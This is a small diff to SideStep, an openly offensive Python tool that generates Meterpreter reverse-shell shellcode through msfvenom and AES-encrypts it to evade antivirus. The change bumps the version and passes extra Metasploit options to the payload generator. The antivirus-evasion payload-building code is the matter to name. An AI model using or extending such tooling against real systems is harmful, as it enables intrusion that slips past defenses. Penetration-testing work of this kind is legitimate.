@@ -1,6 +1,6 @@
 """
 Name:           SideStep
-Version:        0.2.0
+Version:        0.5.0
 Date:           3/30/2015
 Author:         Josh Berry - josh.berry@codewatch.org
 Github:         https://github.com/codewatchorg/sidestep
@@ -116,7 +116,7 @@ def main(argv):
   cryptopp.compileCryptoPP(path_delim, settings.sourceDir, settings.vsPath, settings.sdkPath, settings.kitPathIncl)
 
   print '[-]\tGenerating the Meterpreter shellcode'
-  clearPayload = msfpayload.payloadGenerator(settings.msfpath, settings.msfvenom, settings.msfmeterpreter, ip, port)
+  clearPayload = msfpayload.payloadGenerator(settings.msfpath, settings.msfvenom, settings.msfmeterpreter, ip, port, settings.MsfOptions)
 
   print '[-]\tEncrypting Meterpreter executable'
   encPayload = encryption.aesCbc(settings.encKeyLen, settings.encIvLen, encKey, encIv, clearPayload)
